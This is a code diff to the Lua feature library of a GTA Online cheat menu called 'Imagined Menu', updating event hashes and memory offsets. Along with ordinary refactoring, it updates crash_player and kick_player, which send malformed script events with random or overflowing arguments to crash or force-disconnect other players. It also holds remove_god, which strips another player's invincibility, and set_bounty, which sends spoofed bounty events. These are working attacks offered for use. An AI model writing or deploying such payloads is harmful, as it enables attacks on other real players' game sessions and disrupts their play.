@@ -163,27 +163,18 @@ function features.copy_table(datatable)
   return result
 end
 
-function features.split(str, sep)
-   local result = {}
-   local regex = ("([^%s]+)"):format(sep)
-   for each in str:gmatch(regex) do
-      insert(result, each)
-   end
-   return result
-end
-
 function features.player_from_name(name)
 	if tonumber(name) then
 		if NETWORK.NETWORK_IS_PLAYER_CONNECTED(tonumber(name)) == 1 then return tonumber(name) end
 	end
-	local name = name:lower()
+	name = name:lower()
 	for i = 0, 31 do
-		if NETWORK.NETWORK_IS_PLAYER_CONNECTED(tonumber(i)) == 1 and name == online.get_name(i):lower() then 
+		if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) == 1 and name == online.get_name(i):lower() then 
 			return i
 		end
 	end
 	for i = 0, 31 do
-		if NETWORK.NETWORK_IS_PLAYER_CONNECTED(tonumber(i)) == 1 and online.get_name(i):lower():find(name) then 
+		if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) == 1 and online.get_name(i):lower():find(name) then 
 			return i
 		end
 	end
@@ -195,7 +186,7 @@ function features.player_ped(player)
 end
 
 function features.remove_god(player)
-	online.send_script_event(player, 801199324, PLAYER.PLAYER_ID(), 869796886, 0)
+	online.send_script_event(player, -1388926377, PLAYER.PLAYER_ID(), 869796886, 0)
 end
 
 function features.request_control_once(ent)
@@ -403,8 +394,8 @@ function features.draw_crosshair(x, y, spacing, thickness, r, g, b, a, b_left, b
 	if thickness%2 ~= 0 then thickness = thickness + 1 end
 	local to_x = (1 / res.x)
 	local to_y = (1 / res.y)
-	local spacing_x = (1 / res.x) * spacing
-	local spacing_y = (1 / res.y) * spacing
+	local spacing_x = to_x * spacing
+	local spacing_y = to_y * spacing
 	if borders ~= 0 then
 		local x = x + borders
 		local y = y + borders
@@ -667,11 +658,11 @@ function features.get_player_coords2(player)
 end
 
 function features.is_typing(player)
-	return ENTITY.IS_ENTITY_DEAD(features.player_ped(player), false) == 0 and features.AND(globals.get_int(1644218 + 241 + 136 + 2 + player * 1), 65536) ~= 0 --[[ & 1 << 16 ~= 0 ]] 
+	return ENTITY.IS_ENTITY_DEAD(features.player_ped(player), false) == 0 and features.AND(globals.get_int(1648034 + 241 + 136 + 2 + player * 1), 65536) ~= 0 --[[ & 1 << 16 ~= 0 ]] 
 end
 
 function features.is_otr(player)
-	return NETWORK.NETWORK_IS_PLAYER_CONNECTED(player) == 1 and globals.get_int(2689224 + 1 + (player * 451) + 207) == 1
+	return NETWORK.NETWORK_IS_PLAYER_CONNECTED(player) == 1 and globals.get_int(2689235 + 1 + (player * 453) + 208) == 1
 end
 
 function features.is_excluded(pid)
@@ -771,6 +762,12 @@ function features.can_activate_physics()
 	return features.get_collider_usage() > 50
 end
 
+function features.get_last_char()
+	local outValue = s_memory.alloc()
+	STATS.STAT_GET_INT(utils.joaat("MPPLY_LAST_MP_CHAR"), outValue, -1)
+	return memory.read_int(outValue)
+end
+
 function features.set_entity_velocity(entity, x, y, z)
 	if not features.can_activate_physics() then return end
 	ENTITY.SET_ENTITY_VELOCITY(entity, x, y, z)
@@ -841,8 +838,17 @@ function features.is_frozen(entity)
 	return MISC.IS_BIT_SET(memory.handle_to_pointer(entity) + 0x2E, 1) == 1
 end
 
+function features.has_gravity(entity)
+	return MISC.IS_BIT_SET(memory.handle_to_pointer(entity) + 26, 4) == 0
+end
+
+function features.is_invincible(entity)
+	return MISC.IS_BIT_SET(memory.handle_to_pointer(entity) + 392, 8) == 1
+end
+
 function features.delete_entity(entity)
 	if not entity or entity == PLAYER.PLAYER_ID() or ENTITY.DOES_ENTITY_EXIST(entity) == 0 then return end
+	if PED.GET_VEHICLE_PED_IS_IN(features.player_ped(), false) == entity then TASK.CLEAR_PED_TASKS_IMMEDIATELY(features.player_ped()) end
 	for _, v in ipairs(features.get_all_attachments(entity))
 	do
 		features.delete_entity(v)
@@ -915,7 +921,7 @@ function features.set_bounty(player, amount)
 	for i = 0, 31
 	do	
 		if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) ~= 0 then
-			online.send_script_event(i, 1294995624, PLAYER.PLAYER_ID(), player, 1, (amount >= 0 and amount <= 10000) and floor(amount) or 10000, 0, 1,  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, globals.get_int(1921039 + 9), globals.get_int(1921039 + 10))
+			online.send_script_event(i, 1915499503, PLAYER.PLAYER_ID(), player, 1, (amount >= 0 and amount <= 10000) and floor(amount) or 10000, 0, 1,  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, globals.get_int(1920255 + 9), globals.get_int(1920255 + 10))
 		end
 	end
 end
@@ -925,17 +931,17 @@ function features.crash_player(player)
 
 	system.log('Imagined Menu', format("Sending crash to %s", online.get_name(player)))
 	system.notify('Imagined Menu', format(TRANSLATION["Sending crash to %s"], online.get_name(player)), 255, 50, 0, 255)
+	-- infinite while loops
+	online.send_script_event(player, -555356783, PLAYER.PLAYER_ID(), -72614, 63007, 59027, -12012, -26996, 33398, player)
+	online.send_script_event(player, 526822748, PLAYER.PLAYER_ID(), 2147483647, 2147483647, -72614, 63007, 59027, -12012, -26996, 33398, player)
+	online.send_script_event(player, 526822748, PLAYER.PLAYER_ID(), 2147483647, 2147483647, -788905164)
+	online.send_script_event(player, -555356783, PLAYER.PLAYER_ID(), 4294894682, -4294904289, -788905164)
+	online.send_script_event(player, -555356783, PLAYER.PLAYER_ID(), get_random_args(15))
+	online.send_script_event(player, 526822748, PLAYER.PLAYER_ID(), get_random_args(15))
 
-	online.send_script_event(player, 962740265, PLAYER.PLAYER_ID(), -72614, 63007, 59027, -12012, -26996, 33398, player)
-	online.send_script_event(player, -1386010354, PLAYER.PLAYER_ID(), 2147483647, 2147483647, -72614, 63007, 59027, -12012, -26996, 33398, player)
-	online.send_script_event(player, -1386010354, PLAYER.PLAYER_ID(), 2147483647, 2147483647, -788905164)
-	online.send_script_event(player, 962740265, PLAYER.PLAYER_ID(), 4294894682, -4294904289, -788905164)
-	online.send_script_event(player, 2908956942, PLAYER.PLAYER_ID(), get_random_args(15))
-	online.send_script_event(player, 962740265, PLAYER.PLAYER_ID(), get_random_args(15))
-	online.send_script_event(player, -1386010354, PLAYER.PLAYER_ID(), get_random_args(15))
-	online.send_script_event(player, -1970125962, PLAYER.PLAYER_ID(), get_random_args(15))
-	online.send_script_event(player, -1767058336, PLAYER.PLAYER_ID(), get_random_args(15))
-	online.send_script_event(player, 1757755807, PLAYER.PLAYER_ID(), get_random_args(15))
+	online.send_script_event(player, 550764271, PLAYER.PLAYER_ID(), get_random_args(15))
+	online.send_script_event(player, 1408207199, PLAYER.PLAYER_ID(), get_random_args(15))
+	online.send_script_event(player, 1992522613, PLAYER.PLAYER_ID(), get_random_args(15))
 
 	players.crash[player] = time() + 10
 end
@@ -951,25 +957,26 @@ function features.kick_player(player)
 	else
 		local state = 0
 		CreateRemoveThread(true, 'player_kick_'..player, function()
-			if state == 0 then
-				online.send_script_event(player, 1228916411, PLAYER.PLAYER_ID(), globals.get_int(1893551 + (1 + (player * 599) + 510)))
+			if state == 0 then -- force network bail
+				online.send_script_event(player, 1674887089, PLAYER.PLAYER_ID(), globals.get_int(1892703 + (1 + (player * 599) + 510))) 
+				online.send_script_event(player, 1674887089, PLAYER.PLAYER_ID(), globals.get_int(1920254))
 				state = 1
 				return
 			elseif state == 1 then
-				online.send_script_event(player, 927169576, PLAYER.PLAYER_ID(), get_random_args(15))
-				online.send_script_event(player, -1308840134, PLAYER.PLAYER_ID(), get_random_args(15))
-				online.send_script_event(player, 436475575, PLAYER.PLAYER_ID(), get_random_args(15))
-				online.send_script_event(player, -290218924, PLAYER.PLAYER_ID(), get_random_args(15))
-				online.send_script_event(player, -368423380, PLAYER.PLAYER_ID(), get_random_args(15))
-				online.send_script_event(player, -614457627, PLAYER.PLAYER_ID(), get_random_args(15))
-				online.send_script_event(player, -1991317864, PLAYER.PLAYER_ID(), get_random_args(15))
-				online.send_script_event(player, 163598572, PLAYER.PLAYER_ID(), 0, 30583, 0, 0, 0, -328966, 2098891836, 0)
-				online.send_script_event(player, 998716537, PLAYER.PLAYER_ID(), 1, -1)
+				online.send_script_event(player, -1663428414, PLAYER.PLAYER_ID(), get_random_args(15))
+				online.send_script_event(player, 608596116, PLAYER.PLAYER_ID(), get_random_args(15))
+				online.send_script_event(player, 1781594056, PLAYER.PLAYER_ID(), get_random_args(15))
+				online.send_script_event(player, -1427892428, PLAYER.PLAYER_ID(), get_random_args(15))
+				online.send_script_event(player, 463008662, PLAYER.PLAYER_ID(), get_random_args(15))
+				online.send_script_event(player, -442434037, PLAYER.PLAYER_ID(), get_random_args(15))
+				online.send_script_event(player, -2056857136, PLAYER.PLAYER_ID(), get_random_args(15))
+				online.send_script_event(player, -1991423686, PLAYER.PLAYER_ID(), 0, 30583, 0, 0, 0, -328966, 2098891836, 0)
+				online.send_script_event(player, 2071375245, PLAYER.PLAYER_ID(), 1, -1)
 				state = 2
 				return
-			elseif state == 2 then
-				online.send_script_event(player, 603406648, PLAYER.PLAYER_ID(), random(32, 2147483647), random(-2147483647, 2147483647), 1, 115, random(-2147483647, 2147483647), random(-2147483647, 2147483647), random(-2147483647, 2147483647))
-				online.send_script_event(player, 603406648, PLAYER.PLAYER_ID(), random(-2147483647, -1), random(-2147483647, 2147483647), 1, 115, random(-2147483647, 2147483647), random(-2147483647, 2147483647), random(-2147483647, 2147483647))
+			elseif state == 2 then -- invalid apartment invite
+				online.send_script_event(player, -1390976345, PLAYER.PLAYER_ID(), random(32, 2147483647), random(-2147483647, 2147483647), 1, 115, random(-2147483647, 2147483647), random(-2147483647, 2147483647), random(-2147483647, 2147483647))
+				online.send_script_event(player, -1390976345, PLAYER.PLAYER_ID(), random(-2147483647, -1), random(-2147483647, 2147483647), 1, 115, random(-2147483647, 2147483647), random(-2147483647, 2147483647), random(-2147483647, 2147483647))
 			end
 		end)
 	end
